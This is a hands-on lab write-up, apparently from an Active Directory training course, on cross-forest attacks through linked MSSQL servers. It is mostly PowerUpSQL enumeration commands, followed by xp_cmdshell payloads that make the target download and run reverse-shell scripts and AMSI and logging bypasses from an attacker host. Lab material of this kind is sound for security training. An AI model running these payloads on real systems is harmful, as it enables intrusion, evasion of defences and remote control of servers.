# Hands-on 26: Cross Forest Attacks - MSSQL Servers

- [Hands-on 26: Cross Forest Attacks - MSSQL Servers](#hands-on-26-cross-forest-attacks---mssql-servers)
  - [Tasks](#tasks)
  - [Enumeration](#enumeration)
  - [RCE on DB-SQLSRV](#rce-on-db-sqlsrv)

---

## Tasks

Get a reverse shell on a `db-sqlsrv` in `db.local` forest by abusing database links from `us-mssql`.

<br/>

---

## Enumeration

Import `PowerUpSQL.ps1` using InviShell:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```
. C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.ps1
```

![picture 17](images/364cb35bfb53920774829881908b441c299842f4cf0a9e9e9a38c7d1cf582a01.png)  


<br/>

Then enumerate MSSQL instances:

```
Get-SQLInstanceDomain
```

![picture 18](images/5f5c7e96032310285767e197619a57c808928f5e337bfa5484224df16f8b4746.png)  

- MSSQL instance: `us-mssql.us.techcorp.local`

<br/>

Then check if we can access `us-mssql`:

```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

![picture 19](images/9e3da9bc565682f677bf58504a3c0f368c7929dad00018d4dbd07a3ea629518e.png)  

- The current user can access `us-mssql`

<br/>

Enumerate more information about the MSSQL service:

```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

![picture 20](images/bc42ceedc2ceab48f82c893e6e117ac0365860984aa579e3aba310271622081e.png)  

<br/>

Look for Database Link of `us-mssql`:

```
Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
```

![picture 21](images/62bf01de915a85ce9a03bd798126f4f9f7b99b9449e1852595939f17c3c8c3c4.png)  

- `us-mssql` has remote link on `192.168.23.25`

<br/>

Try to crawl the database link:

```
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local
```

![picture 22](images/9c76386ec464029d01ba5a9b6f3c976335f11dcd2d4b163261cc7085426142ac.png)  

- We can execute command on `db-sqlsrv` from US-MSSQL -> 192.168.23.25 -> DB-SQLSRV

<br/>


## RCE on DB-SQLSRV

Locally serve tools:

```
cd C:\AD\Tools; python -m SimpleHTTPServer 80
```

Launch a powercat listener:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```
. C:\AD\Tools\powercat.ps1; powercat -l -v -p 443 -t 1000
```

<br/>

Use **heidisql.exe** to connect to `us-mssql`:

![picture 23](images/cfe22e441fed78154d6daffc58bc63975d70721b67d6b6465c3c4bdbc1a49b8c.png)  

```
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.64/Invoke-PowerShellTcpEx.ps1'''')"'')');
```

```
select * from openquery("192.168.23.25",'select * from openquery("dbsqlsrv",''select @@version as version;exec master..xp_cmdshell ''''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.64/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/amsibypass.txt);iex (iwr UseBasicParsing http://192.168.100.64/Invoke-PowerShellTcp.ps1)"'''''')');
```